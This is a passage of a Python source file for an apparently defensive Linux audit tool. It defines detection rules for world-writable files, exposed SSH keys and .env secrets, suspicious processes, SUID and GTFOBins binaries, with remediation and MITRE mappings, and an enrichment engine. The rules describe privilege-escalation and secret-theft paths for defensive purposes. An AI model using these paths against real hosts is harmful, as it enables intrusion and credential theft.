        remediation="Restrict permissions: chmod 644 <path> && chown root:root <path>. "
        "Verify with: find /etc/systemd/system -perm /o=w -type f",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1569_002, MitreTechnique.T1574_002],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["systemd", "writable", "privilege-escalation", "service"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-004",
        title_patterns=["Writable system directories"],
        explanation="World-writable directories exist under system paths (/etc, /usr, /opt, "
        "/root, /var, /home). These can be used for privilege escalation through "
        "file replacement, symlink attacks, or library injection.",
        security_impact="Medium - Writable system directories may enable privilege escalation "
        "if an attacker can place files that get sourced or executed by privileged processes.",
        remediation="Review each writable directory and restrict permissions. "
        "Use: chmod o-w <path> or chmod g-w <path> where appropriate.",
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1574_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["writable", "directory", "privilege-escalation", "permissions"],
        confidence_score=0.7,
    ),
    KnowledgeRule(
        rule_id="WRITABLE-005",
        title_patterns=["Root cron job:"],
        explanation="A cron job is configured to run as root. If the target script "
        "is world-writable or in a world-writable location, it can be modified "
        "by any user to execute arbitrary code as root.",
        security_impact="Medium - Root cron jobs running from writable locations allow privilege escalation.",
        remediation="Verify the cron script is owned by root with permissions 700. "
        "Store cron scripts in /root/ or /usr/local/sbin/ with restricted permissions.",
        cis_control="CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running",
        mitre_attack=[MitreTechnique.T1053_003],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["cron", "root", "privilege-escalation", "scheduled-task"],
        confidence_score=0.7,
    ),
]

# ------------------------------------------------------------------
#  Secrets / credential exposure rules
# ------------------------------------------------------------------

SECRETS_RULES = [
    KnowledgeRule(
        rule_id="SEC-001",
        title_patterns=["SSH key found"],
        explanation="An SSH private key was found. If the key is unprotected "
        "(no passphrase, world-readable), it can be used to access remote systems.",
        security_impact="High - Exposed SSH keys can provide access to other systems. "
        "If the key is for the current host, it allows persistent access.",
        remediation="Protect private keys: chmod 600 <path>. Use ssh-keygen -p to add a "
        "passphrase. Consider rotating the key if it may have been exposed.",
        cis_control="CIS Ubuntu Benchmark 5.3.2 - Ensure permissions on SSH private host key files are configured",
        mitre_attack=[MitreTechnique.T1552_004],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["ssh", "key", "credential", "secret"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SEC-002",
        title_patterns=[".env file found"],
        explanation="A .env file containing environment variables (often with "
        "API keys, database passwords, or tokens) was found. These files "
        "frequently contain sensitive credentials.",
        security_impact="High - .env files typically contain database credentials, "
        "API keys, and application secrets that can be used for lateral movement.",
        remediation="Remove .env files from production systems. Use a secrets manager "
        "instead. Ensure .env is in .gitignore and never committed to version control.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["env", "secret", "credential", "exposure"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SEC-003",
        title_patterns=["private-key:", "private-key found", "private key"],
        explanation="A private key file (*.key, *.pem) was discovered on the filesystem. "
        "Private keys grant access to encrypted communications and systems.",
        security_impact="High - Exposed private keys compromise TLS/SSL security, "
        "SSH authentication, and any systems relying on the key pair.",
        remediation="Remove unnecessary key files. Encrypt keys with strong passphrases. "
        "Restrict permissions to 600. Rotate exposed keys immediately.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_004],
        cwe="CWE-312: Cleartext Storage of Sensitive Information",
        tags=["key", "private-key", "credential", "crypto"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SEC-004",
        title_patterns=["Credentials in config:"],
        explanation="A configuration file containing hardcoded credentials (passwords, "
        "API keys, tokens) was found. Hardcoded credentials are a common security issue.",
        security_impact="Critical - Hardcoded credentials in configuration files "
        "can be used for unauthorized access to databases, APIs, and services.",
        remediation="Remove hardcoded credentials. Use environment variables or "
        "a secrets management solution (Vault, Kubernetes Secrets, etc.).",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-798: Use of Hard-coded Credentials",
        tags=["credential", "hardcoded", "secret", "password"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="SEC-005",
        title_patterns=["Sensitive env variable:"],
        explanation="An environment variable containing potential sensitive data "
        "(SECRET, TOKEN, PASSWORD, API_KEY, AWS credentials, etc.) was detected. "
        "Environment variables can be read by all processes on the system.",
        security_impact="Medium - Other processes (including compromised ones) can read "
        "environment variables of the current process via /proc/<pid>/environ.",
        remediation="Use a secrets management solution instead of environment variables. "
        "If env vars must be used, restrict access and consider encryption at rest.",
        cis_control="CIS Control 3: Data Protection",
        mitre_attack=[MitreTechnique.T1552_001],
        cwe="CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        tags=["environment", "secret", "credential", "exposure"],
        confidence_score=0.7,
    ),
]

# ------------------------------------------------------------------
#  Authentication / log rules
# ------------------------------------------------------------------

AUTH_RULES = [
    KnowledgeRule(
        rule_id="AUTH-001",
        title_patterns=["Failed logins:"],
        explanation="Multiple failed login attempts were detected in system logs. "
        "This may indicate a brute-force attack in progress or a misconfigured service.",
        security_impact="Medium to Low - Depending on volume. High volumes suggest "
        "active brute-force attacks. Low volumes may be user error.",
        remediation="Investigate failed login sources. Implement fail2ban or similar "
        "for rate-limiting. Disable root SSH login and enforce key-only authentication.",
        cis_control="CIS Control 8: Audit Log Management",
        mitre_attack=[MitreTechnique.T1110],
        cwe="CWE-307: Improper Restriction of Excessive Authentication Attempts",
        tags=["authentication", "failed-login", "bruteforce", "logs"],
        confidence_score=0.8,
    ),
    KnowledgeRule(
        rule_id="AUTH-002",
        title_patterns=["Direct root logins:"],
        explanation="Direct root logins (not via su or sudo) were detected. "
        "Best practice is to disable direct root login and require "
        "individual user accounts with sudo.",
        security_impact="High - Direct root login bypasses individual accountability "
        "and audit trails. All root actions are attributed to 'root' rather than "
        "the responsible user.",
        remediation="Disable direct root login: 'PermitRootLogin no' in sshd_config. "
        "Configure sudo access for authorized administrators.",
        cis_control="CIS Ubuntu Benchmark 5.3.9 - Ensure SSH root login is disabled",
        mitre_attack=[MitreTechnique.T1078],
        cwe="CWE-287: Improper Authentication",
        tags=["authentication", "root", "login", "logs"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="AUTH-003",
        title_patterns=["High sudo usage:"],
        explanation="A high number of sudo events was detected. This may indicate "
        "normal administrative activity or potentially suspicious behavior.",
        security_impact="Info - High sudo usage warrants review but is not inherently malicious.",
        remediation="Review sudo logs to verify all sudo usage is legitimate. "
        "Consider implementing sudo log aggregation and alerting.",
        tags=["sudo", "logs", "monitoring"],
        confidence_score=0.4,
    ),
]

# ------------------------------------------------------------------
#  Process rules
# ------------------------------------------------------------------

PROCESS_RULES = [
    KnowledgeRule(
        rule_id="PROC-001",
        title_patterns=["Suspicious process:"],
        explanation="A process with a known suspicious or potentially malicious binary "
        "is running. These binaries are commonly used by attackers for "
        "reconnaissance, exploitation, or cryptocurrency mining.",
        security_impact="High - Suspicious processes may indicate a compromised system. "
        "Crypto miners, pentesting tools, and backdoor shells are all red flags.",
        remediation="Investigate the process immediately. Check its parent process, "
        "network connections, and file origin. Kill and remove if unauthorized.",
        cis_control="CIS Control 10: Malware Defenses",
        mitre_attack=[MitreTechnique.T1059_004, MitreTechnique.T1204_002],
        cwe="CWE-506: Embedded Malicious Code",
        tags=["process", "malware", "suspicious", "incident-response"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="PROC-002",
        title_patterns=["High number of root processes"],
        explanation="A large number of processes are running as root. "
        "Running services as root violates the principle of least privilege.",
        security_impact="Low - While not immediately dangerous, services running as root "
        "have more impact if compromised.",
        remediation="Review processes running as root and switch to unprivileged users "
        "where possible using systemd DynamicUser or similar.",
        cis_control="CIS Control 5: Account Management",
        tags=["process", "root", "privilege"],
        confidence_score=0.5,
    ),
]

# ------------------------------------------------------------------
#  Package rules
# ------------------------------------------------------------------

PACKAGE_RULES = [
    KnowledgeRule(
        rule_id="PKG-001",
        title_patterns=["Installed:"],
        explanation="A sensitive package (web server, database, SSH, container runtime) "
        "is installed. Each installed service expands the attack surface.",
        security_impact="Info - Installed packages should be reviewed. Remove unnecessary "
        "services to reduce attack surface.",
        remediation="Remove unused packages: apt remove <package>. "
        "For required services, ensure they are properly secured and regularly updated.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "software", "inventory"],
        confidence_score=0.4,
        source_stages=["packages"],
    ),
    KnowledgeRule(
        rule_id="PKG-002",
        title_patterns=["Potentially unstable apt source"],
        explanation="APT is configured to use unstable, testing, experimental, or sid "
        "repositories. These repositories receive less security testing and may "
        "contain unstable or vulnerable packages.",
        security_impact="Medium - Unstable repositories may introduce vulnerable packages "
        "or break dependencies, leading to security gaps.",
        remediation="Remove unstable/testing repository entries from /etc/apt/sources.list. "
        "Use only stable/LTS repositories in production.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "apt", "repository", "misconfiguration"],
        confidence_score=0.75,
    ),
]

# ------------------------------------------------------------------
#  Service rules
# ------------------------------------------------------------------

SERVICE_RULES = [
    KnowledgeRule(
        rule_id="SVC-001",
        title_patterns=["Suspicious ExecStart:"],
        explanation="A systemd service has ExecStart pointing to a world-writable path "
        "(/tmp, /dev/shm, /var/tmp). This allows any user to replace the binary "
        "and have it executed with the service's privileges.",
        security_impact="High - Any user can replace the executable and gain the "
        "service user's privileges (often root).",
        remediation="Move the binary to a protected system path (/usr/local/bin or /opt). "
        "Ensure proper ownership (root) and permissions (755).",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1574_001, MitreTechnique.T1569_002],
        cwe="CWE-426: Untrusted Search Path",
        tags=["systemd", "service", "writable", "privilege-escalation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="SVC-002",
        title_patterns=["Enabled service:"],
        explanation="A network-accessible service is enabled and running. "
        "Each enabled service expands the attack surface.",
        security_impact="Info - Documenting enabled services for inventory. Review whether each service is necessary.",
        remediation="Disable unused services: systemctl disable <service>. "
        "Ensure required services are properly firewalled.",
        tags=["service", "systemd", "network", "inventory"],
        confidence_score=0.3,
        source_stages=["systemd"],
    ),
]

# ------------------------------------------------------------------
#  Cron rules
# ------------------------------------------------------------------

CRON_RULES = [
    KnowledgeRule(
        rule_id="CRON-001",
        title_patterns=["Writable entries in /etc/cron."],
        explanation="Writable entries were found in cron directories. See WRITABLE-002 for details.",
        security_impact="High - World-writable cron files allow privilege escalation.",
        remediation="Ensure cron scripts are not world-writable and are owned by root.",
        cis_control="CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running",
        mitre_attack=[MitreTechnique.T1053_003],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["cron", "writable", "privilege-escalation"],
        confidence_score=0.9,
    ),
]

# ------------------------------------------------------------------
#  Suspicious binary on PATH (from processes)
# ------------------------------------------------------------------

SUSPICIOUS_BINARY_RULES = [
    KnowledgeRule(
        rule_id="BIN-001",
        title_patterns=["SUID binary", "Capability:", "GTFOBins", "binary"],
        explanation="A binary associated with privilege escalation via GTFOBins was found.",
        security_impact="High - This binary can be used to escalate privileges "
        "when SUID, capabilities, or sudo access is granted.",
        remediation="Remove SUID bit or capabilities if not required. Monitor usage of this binary in audit logs.",
        references=["https://gtfobins.github.io/"],
        cis_control="CIS Control 4: Secure Configuration",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-250: Execution with Unnecessary Privileges",
        tags=["gtfobins", "privilege-escalation", "suid"],
        confidence_score=0.8,
    ),
]

# ------------------------------------------------------------------
#  Filesystem / Permission rules
# ------------------------------------------------------------------

FILESYSTEM_RULES = [
    KnowledgeRule(
        rule_id="FS-001",
        title_patterns=["SGID binary:", "SGID binary"],
        explanation="A binary with the SGID bit set runs with the group permissions "
        "of its group owner. This can lead to privilege escalation if the group has "
        "access to sensitive resources.",
        security_impact="Medium - Similar to SUID but grants group-level privileges. "
        "Can be exploited if the group has write access to system files.",
        remediation="Remove the SGID bit if not required: chmod g-s <path>.",
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["sgid", "privilege-escalation", "permissions"],
        confidence_score=0.75,
    ),
]

# ------------------------------------------------------------------
#  Combine all rules
# ------------------------------------------------------------------

ALL_RULES: list[KnowledgeRule] = (
    PRIVILEGE_ESCALATION_RULES
    + CAPABILITY_RULES
    + SSH_RULES
    + DOCKER_RULES
    + KERNEL_RULES
    + WRITABLE_RULES
    + SECRETS_RULES
    + AUTH_RULES
    + PROCESS_RULES
    + PACKAGE_RULES
    + SERVICE_RULES
    + CRON_RULES
    + SUSPICIOUS_BINARY_RULES
    + FILESYSTEM_RULES
)


# =========================================================================
#  Enriched Finding
# =========================================================================


@dataclass
class EnrichedFinding:
    """A Finding extended with knowledge-base enrichment data.

    All original ``Finding`` attributes are accessible via attribute
    delegation (``__getattr__``), so this class can be used anywhere
    a ``Finding`` is expected.
    """

    finding: Finding
    explanation: str = ""
    security_impact: str = ""
    remediation: str = ""
    enriched_references: list[str] = field(default_factory=list)
    cis_control: str = ""
    mitre_attack: list[str] = field(default_factory=list)
    cwe: str = ""
    enriched_tags: list[str] = field(default_factory=list)
    gtfo_bins: list[dict[str, str]] = field(default_factory=list)
    cve_references: list[str] = field(default_factory=list)
    confidence_score: float = 0.0

    def __getattr__(self, name: str) -> Any:
        return getattr(self.finding, name)

    def to_dict(self) -> dict[str, Any]:
        result = self.finding.to_dict()
        result.update(
            {
                "explanation": self.explanation,
                "security_impact": self.security_impact,
                "remediation": self.remediation,
                "enriched_references": self.enriched_references,
                "cis_control": self.cis_control,
                "mitre_attack": self.mitre_attack,
                "cwe": self.cwe,
                "enriched_tags": self.enriched_tags,
                "gtfo_bins": self.gtfo_bins,
                "cve_references": self.cve_references,
                "confidence_score": self.confidence_score,
            }
        )
        return result

    def has_enrichment(self) -> bool:
        """Return ``True`` if any enrichment data was applied."""
        return bool(
            self.explanation
            or self.security_impact
            or self.remediation
            or self.enriched_references
            or self.cis_control
            or self.mitre_attack
            or self.cwe
            or self.gtfo_bins
            or self.cve_references
        )


# =========================================================================
#  Enrichment Engine
# =========================================================================


class EnrichmentEngine:
    """Matches findings against the knowledge base and produces enriched findings.

    Usage::

        engine = EnrichmentEngine()
        enriched = engine.enrich_finding(finding)
        all_enriched = engine.enrich_all(findings)
    """

    def __init__(self, rules: list[KnowledgeRule] | None = None) -> None:
        self._rules = ALL_RULES if rules is None else rules

    def enrich_finding(self, finding: Finding) -> EnrichedFinding:
        """Apply enrichment to a single finding.

        Matches the finding against knowledge rules by title substring
        and source_stage/category filters. Also checks evidence for
        GTFOBins binary paths.
        """
        enriched = EnrichedFinding(finding=finding)
        matched_rules = [rule for rule in self._rules if self._rule_matches(rule, finding)]

        if not matched_rules:
            return enriched

        self._merge_rule_enrichment(enriched, matched_rules)
        self._apply_gtfobins_fields(enriched, finding)

        return enriched

    def _merge_rule_enrichment(
        self,
        enriched: EnrichedFinding,
        matched_rules: list[KnowledgeRule],
    ) -> None:
        for rule in matched_rules:
            self._apply_evidence_and_explanation(enriched, rule)
            self._apply_remediation_info(enriched, rule)
            self._apply_tags(enriched, rule)
            self._apply_confidence_adjustment(enriched, rule)

    @staticmethod
    def _apply_evidence_and_explanation(
        enriched: EnrichedFinding,
        rule: KnowledgeRule,
    ) -> None:
        if not enriched.explanation and rule.explanation:
            enriched.explanation = rule.explanation
        if not enriched.security_impact and rule.security_impact:
            enriched.security_impact = rule.security_impact
        if rule.references:
            enriched.enriched_references = list(set(enriched.enriched_references + rule.references))

    @staticmethod
    def _apply_remediation_info(
        enriched: EnrichedFinding,
        rule: KnowledgeRule,
    ) -> None:
        if not enriched.remediation and rule.remediation:
            enriched.remediation = rule.remediation
        if not enriched.cis_control and rule.cis_control:
            enriched.cis_control = rule.cis_control
        if rule.mitre_attack:
            enriched.mitre_attack = list(set(enriched.mitre_attack + rule.mitre_attack))
        if not enriched.cwe and rule.cwe:
            enriched.cwe = rule.cwe

    @staticmethod
    def _apply_tags(enriched: EnrichedFinding, rule: KnowledgeRule) -> None:
        if rule.tags:
            enriched.enriched_tags = list(set(enriched.enriched_tags + rule.tags))

    @staticmethod
    def _apply_confidence_adjustment(
        enriched: EnrichedFinding,
        rule: KnowledgeRule,
    ) -> None:
        if rule.confidence_score > enriched.confidence_score:
            enriched.confidence_score = rule.confidence_score

    def _apply_gtfobins_fields(
        self,
        enriched: EnrichedFinding,
        finding: Finding,
    ) -> None:
        gtfo_matches = self._check_gtfobins(finding)
        enriched.gtfo_bins = gtfo_matches
        if not gtfo_matches:
            return
        rule = SUSPICIOUS_BINARY_RULES[0]
        if not enriched.explanation:
            enriched.explanation = rule.explanation
        if not enriched.security_impact:
            enriched.security_impact = rule.security_impact
        if not enriched.remediation:
            enriched.remediation = rule.remediation
        if not enriched.cis_control:
            enriched.cis_control = rule.cis_control
        if not enriched.mitre_attack:
            enriched.mitre_attack = list(rule.mitre_attack)
        if not enriched.cwe:
            enriched.cwe = rule.cwe
        if enriched.confidence_score < rule.confidence_score:
            enriched.confidence_score = rule.confidence_score

    def enrich_all(self, findings: list[Finding]) -> list[EnrichedFinding]:
        """Apply enrichment to every finding in the list."""
        return [self.enrich_finding(f) for f in findings]

    def _rule_matches(self, rule: KnowledgeRule, finding: Finding) -> bool:
        """Check if a rule matches a finding."""
        # Check source_stage filter
        if rule.source_stages and finding.source_stage.lower() not in [s.lower() for s in rule.source_stages]:
            return False

        # Check source_category filter
        if rule.source_categories and finding.category.lower() not in [c.lower() for c in rule.source_categories]:
            return False

        # Check title patterns
        title_lower = finding.title.lower()
        return any(pattern.lower() in title_lower for pattern in rule.title_patterns)

    @staticmethod
    def _check_gtfobins(finding: Finding) -> list[dict[str, str]]:
        """Check finding title and evidence for GTFOBins binary paths."""
        results: list[dict[str, str]] = []
        seen_binaries: set[str] = set()
        text = f"{finding.title} {finding.evidence} {finding.description}"

        for full_path in re.findall(r"/[\w/.-]+", text):
            binary_part = full_path.split("/")[-1].lower()
            if binary_part in GTFOBINS_BINARIES and binary_part not in seen_binaries:
                seen_binaries.add(binary_part)
                entry = dict(GTFOBINS_BINARIES[binary_part])
                entry["binary"] = binary_part
                results.append(entry)

        return results


# =========================================================================
#  Convenience helpers
# =========================================================================

_default_engine = EnrichmentEngine()


def enrich_finding(finding: Finding) -> EnrichedFinding:
    """Enrich a single finding using the default engine."""
    return _default_engine.enrich_finding(finding)


def enrich_all(findings: list[Finding]) -> list[EnrichedFinding]:
    """Enrich all findings using the default engine."""
    return _default_engine.enrich_all(findings)


__all__ = [
    "ALL_RULES",
    "GTFOBINS_BINARIES",
    "CisControl",
    "EnrichedFinding",
    "EnrichmentEngine",
    "KnowledgeRule",
    "MitreTechnique",
    "enrich_all",
    "enrich_finding",
]
